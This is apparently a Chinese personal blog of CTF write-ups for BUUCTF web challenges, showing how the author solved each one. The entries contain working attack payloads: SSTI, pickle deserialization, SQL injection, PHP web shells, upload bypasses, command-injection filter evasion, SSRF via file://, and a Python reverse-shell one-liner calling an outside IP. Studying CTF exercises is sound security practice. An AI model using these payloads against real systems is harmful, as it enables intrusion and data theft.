<h2><span id="7护网杯-2018easy_tornado">7.[护网杯 2018]easy_tornado</span></h2><p>打开几个提示<br>/flag.txt<br>flag in /fllllllllllllag<br>/hints.txt<br>md5(cookie_secret+md5(filename))<br>/welcome.txt<br>render<br>因此要想构造出flag的md5必须得知道cookie_secret的部分<br>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名<br>RequestHandler.settings<br>An alias for self.application.settings.<br>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
<p>构造payload获取cookie_secret</p>
<p>/error?msg={{handler.settings}}<br>然后得到:</p>
<pre><code>    {&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;51402c11-770e-41fb-866e-e7cfe13af08b&#39;} </code></pre><p>最后在url中?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))<br>即可得到flag</p>
<h2><span id="8ciscn2019-华北赛区-day1-web2ikun">8.[CISCN2019 华北赛区 Day1 Web2]ikun</span></h2><p>这道题是还很多的文章帮助下完成的，贴一个文章即可：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11786132.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11786132.html</a><br>进入页面后是全篇的kunkun应援团，这里封面有个关键得一点，ikun们冲鸭,一定要买到lv6!!!<br>在注册了用户后，发现自己有1000块钱可以用来买lv.但是往下面翻了翻，只有lv4,lv5翻很多页都没有lv6，于是需要上脚本找一哈lv6在哪一页。</p>
<pre><code class="python">    import requests
    i=0
    url=&quot;http://1264639c-ef88-49b4-8bea-90da6726f207.node3.buuoj.cn/&quot;
    for i in range(1,2000):
        re=requests.get(url+&quot;shop?page=&quot;+str(i))
        if re.text.find(&quot;lv6.png&quot;) !=-1:
            print(i)
            break</code></pre>
<p>这里先自己写了一个然后跟着赵师傅改了一下，这里说一下find里面的lv6.png是审查页面元素时候发现的，这个也是之前学爬虫学到的知识点。然后根据脚本找到page=180页过去，发现买不上，再次f12发现在from表单中存在折扣项，我把它value改成0.0000001这样就足够买上lv6了终于到lv6了结果提示需要admin才行。<br>抓包后发现jwt<br>jwt:json web token也就是一种认证用户的令牌，保存在客户端，cookie中，<br>上<a href="https://jwt.io/发现是HS256对称加密的，用推荐的[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥，跑出来密钥是1Kun.然后将密钥与username部分更改为1Kun和admin" target="_blank" rel="noopener">https://jwt.io/发现是HS256对称加密的，用推荐的[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥，跑出来密钥是1Kun.然后将密钥与username部分更改为1Kun和admin</a><br>然后将生成的jwt与之前的替换，发包，发现已经成为了admin,然后又有新提示，</p>
<pre><code class="html">    &lt;div class=&quot;ui text container login-wrap-inf&quot;&gt;
    &lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;
    &lt;a href=&quot;/static/asd1f654e683wq/www.zip&quot; &gt;&lt;span style=&quot;visibility:hidden&quot;&gt;删库跑路前我留了好东西在这里&lt;/span&gt;&lt;/a&gt;
    &lt;div class=&quot;ui segments center padddd&quot;&gt;
    &lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;
    &lt;div class=&quot;ui segment&quot;&gt;
    &lt;img src=&quot;/static/img/b.png&quot; alt=&quot;&quot;/&gt;</code></pre>
<p>访问这个<a href="http://www.zip发现源码，审计源代码sshop/views/Admin.py" target="_blank" rel="noopener">www.zip发现源码，审计源代码sshop/views/Admin.py</a> 有个反序列化点。<br>然后使用师傅给的脚本生成</p>
<pre><code class="python">    import pickle
    import urllib

    class payload(object):
        def __reduce__(self):
           return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))

    a = pickle.dumps(payload())
    a = urllib.quote(a)
    print a</code></pre>
<p>become参数生成后，用BP发包即可拿到flag.<br>接下来强化学习这道题的知识点。<br>JWT:</p>
<p>pickle:pickle是python中用于序列化的模块，其主要用于python特有类型和python的数据类型间转换。<br>pickle提供四个功能:dumps,dump,loads,load<br>同样还有一个模块json也提供了同样的，但json主要用于字符串和python数据类型间进行转换。<br>pickle模块中常用的方法有:<br>1.pickle.dump(obj,file,protocol=None)</p>
<ol start="2">
<li>pickle.load(file,*,fix_imports=True, encoding=”ASCII”, errors=”strict”)<br>必填参数file必须以二进制可读模式打开，即“rb”，其他都为可选参数</li>
<li>pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中</li>
<li>pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</li>
</ol>
<h2><span id="9bjdctf2020ezphp">9.[BJDCTF2020]EzPHP</span></h2><p>首先打开页面，老规矩直接看源代码，发现提示:GFXEIM3YFZYGQ4A=<br>尝试进行base64解码结果是乱码，继续尝试base32解码，发现：1nD3x.php<br>打开后发现源码:</p>
<pre><code class="php">     &lt;?php
    highlight_file(__FILE__);
    error_reporting(0); 

    $file = &quot;1nD3x.php&quot;;
    $shana = $_GET[&#39;shana&#39;];
    $passwd = $_GET[&#39;passwd&#39;];
    $arg = &#39;&#39;;
    $code = &#39;&#39;;

    echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;

    if($_SERVER) { 
        if (
            preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])
            )  
            die(&#39;You seem to want to do something bad?&#39;); 
    }

    if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) {
        if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) { 
            $file = $_GET[&quot;file&quot;]; 
            echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;
        } 
    } else die(&#39;fxck you! What do you want to do ?!&#39;);

    if($_REQUEST) { 
        foreach($_REQUEST as $value) { 
            if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))  
                die(&#39;fxck you! I hate English!&#39;); 
        } 
    } 

    if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)
        die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);


    if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){
        extract($_GET[&quot;flag&quot;]);
        echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
    } else{
        die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);
    }

    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 
    preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) { 
        die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); 
    } else { 
        include &quot;flag.php&quot;;
        $code(&#39;&#39;, $arg); 
    } ?&gt;
    This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
    Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?</code></pre>
<h2><span id="10rctf2015">10.RCTF2015</span></h2><p>进入页面后，发现有登陆和注册两个链接的,注册的时候注册一个cupid,看会不会出错，居然可以注册有特殊符号的，进去后，发现有忘记密码功能，试试能否正常忘记密码。尝试修改密码发现:</p>
<pre><code class="SQL">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;cupid\&quot; and pwd=&#39;202cb962ac59075b964b07152d234b70&#39;&#39; at line 1</code></pre>
<p>发现出现了sql报错，这就是典型的二次注入的例子了，简单说一下我对自己二次注入的理解，在注册非法账号时，系统对其进行了过滤或者不处理，并且送入数据库时候以注册输入的字符一样存储，导致，修改密码时候，修改密码时服务器查询数据库导致报错，利用这一点可以进行二次注入。同样做sql注入时候可以用BP或者其他工具进行简单的sql-fuzz测试。</p>
<pre><code class="sql">union
where
from
and
extractvalue
以及BP中的sql-fuzz</code></pre>
<p>fuzz直接使用注册功能爆破即可，如果能够成功注册那么就很大几率能够进行二次注入，通过BP爆破发现:union,order by等进行联合查询所必须的被ban了，因而直接尝试使用updatexml或者extractvalue进行报错注入。<br>首先注册账号</p>
<pre><code class="post">    username=cupid&quot;^updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<p>爆出数据库名为</p>
<pre><code class="database()">XPATH syntax error: &#39;~web_sqli~&#39;</code></pre>
<p>继续注册账号</p>
<pre><code class="post">    username=cupid&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<p>爆出表名</p>
<pre><code class="table_name">    XPATH syntax error: &#39;~article,flag,users~&#39;</code></pre>
<p>解析来爆字段</p>
<pre><code class="column_name">    username=cupid&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<p>爆出所有字段</p>
<pre><code class="字段">    XPATH syntax error: &#39;~title,content,flag,name,pwd,ema&#39;</code></pre>
<p>解析来爆字段内容<br>这道题最过分的是，flag不在flag字段里面，真的要让人吐血，还是写脚本靠谱，奈何太菜了写不动，继续试试其他的字段<br>猜测应当是users中的pwd</p>
<pre><code class="pwd">    username=cupid&quot;^updatexml(1,concat(0x7e,(select(pwd)from(users)),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<p>然后发现Subquery returns more than 1 row<br>存在长度限制列数限制，重新查一遍users表中的列名</p>
<pre><code class="user表列名">    username=cupid&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<pre><code>爆破出:XPATH syntax error: &#39;~name,pwd,email,real_flag_1s_her&#39;</code></pre><p>这里感觉长度受限制了，这个字段应该后门是here，没出来，查询real_flag_1s_her字段内容果然没有，加上e继续查询<br>看样子flag在这个字段里面，直接查字段内容:</p>
<pre><code class="real_flag_1s_here">    username=cupid&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#&amp;password=123&amp;email=123</code></pre>
<p>发现XPATH syntax error: ‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’<br>果然长度受限看不到结果，能力有限最终没能拿到flag.于是打开了大佬的WP，发现substr也被ban了，看了wp发现可以用正则</p>
<pre><code class="payload">username=cupid&quot;^updatexml(1,concat((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#&amp;password=123&amp;email=123</code></pre>
<p>总算查询到了一半flag:XPATH syntax error: ‘{925c3daa-870a-4b04-8c3f-4fb0c1a’<br>其实我要骂人的，fuck!<br>然后据说使用reverse即可查到全部flag</p>
<pre><code class="sql">    username=peri0d&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;))),1))#&amp;password=123&amp;email=123</code></pre>
<p>最后拿到:XPATH syntax error: ‘}9bb3ca1c0bf4-f3c8-40b4-a078-aad’<br>拼接一下就可以了。<br>这题学到了很多骚知识，比如最后那个reverse是真的，没有想到，以及在查询长度受限制情况下应当怎么样思考，get it.</p>
<h2><span id="11de1ctf-2019ssrf-me">11.[De1CTF 2019]SSRF Me</span></h2><h2><span id="12actf2020-新生赛upload">12.[ACTF2020 新生赛]Upload</span></h2><p>同样是黑名单过滤不全，phtml文件可以直接上传，其他的文件内容:</p>
<pre><code class="phtml">GIF89a
&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;666&#39;]);&lt;/script&gt;</code></pre>
<p>上传后在根目录下的flag目录中取得flag</p>
<h2><span id="13actf2020-新生赛exec">13.[ACTF2020 新生赛]Exec</span></h2><p>进入页面后跟DVWA那个ping差不多，猜测代码应该就是个exec函数，尝试用<br>     127.0.0.1&amp;&amp;cat /flag<br>无果，既然是exec函数，用法应当是用;号进行连接语句<br>再次尝试:<br>      127.0.0.1;cat /flag<br>拿到flag</p>
<h2><span id="14actf2020-新生赛backupfile">14.[ACTF2020 新生赛]BackupFile</span></h2><p>进去后让我找找源代码，以前做过一个备份题，试试index.php.bak,果然成功下载到源码:</p>
<pre><code class="php">&lt;?php
include_once &quot;flag.php&quot;;

if(isset($_GET[&#39;key&#39;])) {
    $key = $_GET[&#39;key&#39;];
    if(!is_numeric($key)) {
        exit(&quot;Just num!&quot;);
    }
    $key = intval($key);
    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo &quot;Try to find out source file!&quot;;
}</code></pre>
<p>很简单的若类型比较构造?key=123即可拿到flag.</p>
<h2><span id="15gxyctf2019ping-ping-ping">15.[GXYCTF2019]Ping Ping Ping</span></h2><p>进入页面后显示/?ip=<br>意思就是get传入可执行命令拿到flag.<br>这里尝试ip=127.0.0.1&amp;&amp;ls,ls好像没有执行，换一个</p>
<pre><code class="exec">    ip=127.0.0.1&amp;&amp;ls
    ip=127.0.0.1;ls
    ip=127.0.0.1||ls</code></pre>
<p>结果只有或成功了，就是上面第三个，然后发现了flag.php与index.php<br>接下来尝试127.0.0.1||cat flag.php<br>然后是:/?ip= fxck your space!<br>那就是空格被过滤了，试试Url中的+,%0a等等，也被过滤了。<br>百度了一下发现linux下空格过滤有:<br>    &lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、<br>&lt;&gt;看样子被过滤了，%20也过滤了，<br>后门三个没被过滤:$IFS$9、 ${IFS}、$IFS<br>这下是fxck your flag,看样子直接书写flag也是不行的<br>绕过flag方法就多了有:base64,hex,oct,单引号双引号，反斜杠，拼接<br>我们一个一个试试:<br>下面所有的空格用:$IFS<br>先试试base64<br>        ?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash ==&gt;cat /flag<br>这个可能是哪个被过滤了，试试将bash改为sh<br>下面这个即可拿到flag,但是还要尝试下其他方法<br>        ?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<br>一直手动测试过滤规则不是办法，之前还有个index.php尝试读取:<br>        ?ip=127.0.0.1||cat$IFSindex.php<br>没有读取到。。怀疑是这个空格和后门都是英文字母混淆了，换成$IFS$9代替空格，查到源码如下</p>
<pre><code class="php">/?ip=
|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
    die(&quot;fxck your symbol!&quot;);
  } else if(preg_match(&quot;/ /&quot;, $ip)){
    die(&quot;fxck your space!&quot;);
  } else if(preg_match(&quot;/bash/&quot;, $ip)){
    die(&quot;fxck your bash!&quot;);
  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
    die(&quot;fxck your flag!&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
  echo &quot;

&quot;;
  print_r($a);
}

?&gt;</code></pre>
<p>有了源码就好办了，<br>使用如下任意payload即可拿到flag</p>
<pre><code class="payload">?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //编码的base64方法
?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php  //拼接方法</code></pre>
<h2><span id="16hctf-2018admin">16.[HCTF 2018]admin</span></h2><p>首先先尝试注册非法账号cupid,但是修改密码没有报错，猜测这里不是二次注入，从名字来看应该要得到admin用户才可以拿到flag,打开源码看到you are not admin.果然，回顾刚刚改密码自己应该每一个步骤都需要看一下源码，因为从其他人WP知道了改密码页面有提示。<br>于是我回到改密码页面，打开源代码发现：<br>    <a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a><br>与是去下载到源码:</p>
<p>注册用户ᴀdmin，这里是A是unicode编码的A，因而看起来是小的，注册后修改密码即可，再登陆即可拿到flag.然而根据大佬的博客复现才发现，UnicodeError，导致这种方法不可用。</p>
<h2><span id="17buu-code-review-1">17.BUU CODE REVIEW 1</span></h2><p>进入页面是源码审计</p>
<pre><code class="php">     &lt;?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = &quot;&quot;;
   public $input = &quot;&quot;;

   public function __destruct() {
       try {
           $this-&gt;correct = base64_encode(uniqid());
           if($this-&gt;correct === $this-&gt;input) {
               echo file_get_contents(&quot;/flag&quot;);
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET[&#39;pleaseget&#39;] === &#39;1&#39;) {
    if($_POST[&#39;pleasepost&#39;] === &#39;2&#39;) {
        if(md5($_POST[&#39;md51&#39;]) == md5($_POST[&#39;md52&#39;]) &amp;&amp; $_POST[&#39;md51&#39;] != $_POST[&#39;md52&#39;]) {
            unserialize($_POST[&#39;obj&#39;]);
        }
    }
}
</code></pre>
<p>先看下面的部分，这个md5很好绕，直接传入数组即可绕过，然后需要传入序列化的obj满足上面的条件使得魔术方法_destruct在对象销毁时候触发，即反序列化，那么只需要序列化一个满足这个类中判断的语句即可。<br>上网看到了一个满足他们相等的很好的办法，直接让<br>        $a=new BUU();<br>        $a-&gt;input=&amp;$a-&gt;correct;<br>类似于C语言中的赋指针，即可满足条件那么接下来将其序列化即可，写以下php：</p>
<pre><code class="php">&lt;?php
class BUU {
   public $correct = &quot;&quot;;
   public $input = &quot;&quot;;

   public function __destruct() {
       try {
           $this-&gt;correct = base64_encode(uniqid());
           if($this-&gt;correct === $this-&gt;input) {
               echo file_get_contents(&quot;/flag&quot;);
           }
       } catch (Exception $e) {
       }
   }
}
$a=new BUU();
$a-&gt;input=&amp;$a-&gt;correct;
echo serialize($a);    //得到O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}
    ?&gt;</code></pre>
<p>md5部分用下面或者数组绕过即可：<br>md51=QNKCDZO&amp;md52=240610708<br>最后按条件传值即可拿到flag.</p>
<h2><span id="18gyctf2020blacklist">18.[GYCTF2020]Blacklist</span></h2><pre><code class="过滤规则">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
<pre><code>73656c6563742a66726f6d60776f72647360  hex编码-&gt;select * from `words`</code></pre><p>本来准备全部使用强网杯随便注的payload,结果set 和rename被禁了，因而使用如下:</p>
<pre><code class="payload">    1&#39;;
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#</code></pre>
<h2><span id="19suctfcheckin">19.[SUctf]Checkin</span></h2><p>进入页面后是一个简单的上传页面，看样子是考上传漏洞，先试试上传之前的yijuhua.phtml,内容为:</p>
<pre><code class="js-php">GIF89a
&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;666&#39;]);&lt;/script&gt;</code></pre>
<p>抓包后上传，很明显不管怎么上传都绕不过后缀，也就是很有可能是白名单策略，只准image类文件，之前有学到图片一句话木马，那就先上传yijuhua.jpg吧</p>
<pre><code class="然后显示了这个">Your dir uploads/d57583a334819a28038b398dd11b00cf &lt;br&gt;Your files : &lt;br&gt;array(4) {
  [0]=&gt;
  string(1) &quot;.&quot;
  [1]=&gt;
  string(2) &quot;..&quot;
  [2]=&gt;
  string(9) &quot;index.php&quot;
  [3]=&gt;
  string(11) &quot;yijuhua.jpg&quot;
}</code></pre>
<p>感觉可以利用，只要让yijuhu.jpg的内容进到index.php里面就可以连接。这里看大佬都提到了.htaccess文件的利用。这道题不行但是后面还是要去了解一哈这种方式。这里说一下.user.ini文件:”自PHP5.3.0”起。php支持基于每个目录的.htaccess风格的INI文件，此类文件仅被CGI/FastCGI SAPI处理，因而使得PECL的htscanner扩展作废。如果使用Apache，则用.htaccess文件有同样效果，。“<br>也就是说这个文件类似于.htaccess,但是作用范围比它广泛。（摘from -cl4y师傅的博客）。<br>然后主要研究一哈这个文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a><br>于是再上传</p>
<pre><code class=".user.ini">GIF89a

auto_prepend_file=shell.jpg</code></pre>
<p>就达到了目的，然后用蚁剑连接该目录下的index.php然后连上后，就找到了flag.</p>
<h2><span id="20">20.</span></h2><pre><code class="JS">&lt;script&gt;
        var stats_data = {&quot;account_id&quot;: 1, &quot;id&quot;: 1, &quot;name&quot;: &quot;admin&quot;, &quot;type&quot;: &quot;user&quot;};
    &lt;/script&gt;</code></pre>
<h2><span id="21bjdctf2020the-mystery-of-ip">21.[BJDCTF2020]The mystery of ip</span></h2><p>进入页面后是一个比较炫酷的blog界面，当然了flag页面赫然在列，点进去后直接提示了我的IP是。。。。。<br>那我试试X-F-F可不可以显示其他IP，BP抓包后改为127.0.0.1，结果就显示我的IP是127.0.0.1<br>给什么就显示什么，存在XSS，或者SSTI，前段时间才学了这个SSTI,先来检测哈<br>        X-Forwarded-For：4<br>结果页面显示4，哇<br>很明显存在SSTI了，好了直接SSTI执行<br>        X-Forwarded-For：system(‘cat /flag’)<br>&lt;&gt;</p>
<h2><span id="22vampn2020-公开赛checkin">22.[V&amp;N2020 公开赛]CHECKIN</span></h2><p>进入页面后是一堆python代码，ctrl+u就能看到其正确格式代码:</p>
<pre><code class="python-flask">from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)
# flag = flag_file.read()
# flag_file.close()
#
# @app.route(&#39;/flag&#39;)
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;

@app.route(&#39;/&#39;)
def source():
    return open(&quot;app.py&quot;,&quot;r&quot;).read()

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;)

</code></pre>
<p>先审计一波代码，很明显用的flask,然后先打开了flag.txt,注释里面有读取和关闭，但是实际是没有的，因而不看注释部分，首先是路由是在shell下，进入shell函数，在shell路径下，以get方式传入了参数c,并且将其当命令执行了。当然在这之上有个删除flag.txt.我们知道这里是永久删除，那岂不是就看不到flag了。之前我们看了一篇关于删库跑路的，我在很多评论和一些大佬的说笑中，听到了一种很有趣的恢复方法。这里正好符合，那就是在rm -f时，没有关闭文件，这时候其实文件依然在进程中。然后我们查看进程，就可以看到被删除的文件。<br>好了思路很清晰，那么第一步需要连接上shell,也就是反弹回来，因为是python写的，直接尝试用python的shell反弹，shell如下所示</p>
<pre><code class="shell">/shell?c=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.160&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;    </code></pre>
<p>上面的ip是buu的内网机的内网IP。如果我有一个外网服务器的话，有外网IP也可以弹shell.ok,shell弹回来了，先ls一波：<br><img src="https://github.com/bephplover/bephplover.github.io/blob/master/img/22-ls.png" alt><br>然后直接查看进程<br>    cat /proc/<em>/fd/</em><br>就可以看到flag.txt里面的内容了：<br><img src="https://github.com/bephplover/bephplover.github.io/blob/master/img/22-flag.png" alt></p>
<h2><span id="23网鼎杯-2018fakebook">23.[网鼎杯 2018]Fakebook</span></h2><p>进入页面后同样有注册和登陆页面，先填写信息，然后登陆进去，再测试功能点。<br>对了要养成习惯看下有没有robors.txt.果然有惊喜：发现index.php.bak<br>打开为如下代码:</p>
<pre><code class="php">class UserInfo
{
    public $name = &quot;&quot;;
    public $age = 0;
    public $blog = &quot;&quot;;

    public function __construct($name, $age, $blog)
    {
        $this-&gt;name = $name;
        $this-&gt;age = (int)$age;
        $this-&gt;blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this-&gt;get($this-&gt;blog);
    }

    public function isValidBlog ()
    {
        $blog = $this-&gt;blog;
        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
    }

}</code></pre>
<p>很早前就知道curl系列函数会造成ssrf.现在仔细了解一哈每个函数的过程，每次代码审计都把每一行代码搞清楚。<br>先是定义了一个userinfo类，进入类中是定义了几个公共变量就是之前添的几个，然后定义了一个析构函数，在析构函数里面调用了本类中的几个变量。<br>然后就是进入get函数了，参数为url,然后是初始化curl，返回资源。<br>设置curl的选项为通过curl访问url获取资源，然后是通过CUPLOPT_RETURNTRANSFER设置为将结果返回而不是直接显示，如果为0或者false应当为显示。<br>最后用output来接收返回的数据。并且通过httpcode判断返回资源的状态码，如果是404对其进行处理，最后关闭curl资源，并且返回output，返回其实跟打印也差不多了。<br>下面是一个获得blog内容函数和判断blog是否内容合法的函数，也就是过滤防止xss等的函数。<br>所以该题的关键利用点在于get函数。由于它会获取固定url的资源并将结果返回到自己页面上，这就造成了SSRF。这里我们可以让他自己把自己的flag返回过来，利用file:///协议。<br>然后接下来找利用点，点进用户界面发现url中no=1,习惯性加上引号，然后出现报错，说明存在sql注入。<br>经过多番测试，发现过滤了0x系列，union select.<br>这里直接使用union/**/即可绕过，然后开始sql注入,<br>先用order by 测出字段数为4</p>
<pre><code class="sql">no=-1 union/**/select 1,database(),3,4 --返回为fakebook

no=-1 union/**/select 1,group_concat(table_name),3,4 from 
information_schema.tables where table_schema=database()    --返回users

no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()--爆出字段为no,username,passwd,data 

最后直接查data内容
no=-1 union/**/select 1,data,3,4 from users
得到:
O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;}    </code></pre>
<p>这里就看出问题了查出来的内容会把我们的信息进行序列化，因而构造file协议读取flag.php，然后每次sql都会发现路径:<br>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31<br>猜测flag在/var/www/html/flag.php<br>最后在之前查出的代码后门加上:</p>
<pre><code class="payload">$a=new UserInfo(&#39;admin&#39;,12,&#39;file:///var/www/html/flag.php&#39;);
$b=serialize($a);
echo $b;</code></pre>
<p>得到序列化:</p>
<pre><code class="ser">no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php</code></pre>
<p>接下来构造sql语句如下:</p>
<pre><code class="payload">no=-1 union/**/select 1,2,no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></pre>
<h2><span id="24swpu2019web1">24.[SWPU2019]Web1</span></h2><p>这道题比赛的时候没有做出来很可惜，现在来复现一波，考点也是二次注入。<br>先注册一个admin,123进入后，很可惜没有其他的操作自己用户名的功能了，那么继续测试。发现有个广告招商，再次尝试输入：<br><img src="/2020/05/09/BUUCTF-WP/IMG/BUU/1.png" alt="Image text"><br>我们回到首页去查看，发现:<br><img src="/2020/05/09/BUUCTF-WP/IMG/BUU/2.png" alt="Image text"><br>于是进行二次注入，同理先使用BP测试过滤规则<br>经过测试后发现or,union select都被过滤了。但是测试/**/可以绕过。然而or被过滤的死死的了。导致information_schema系列无法使用，这里参考大佬的文章绕过:<br><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a><br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>mysql.innodb_table_stats用于爆表名<br>select group_concat(table_name) from 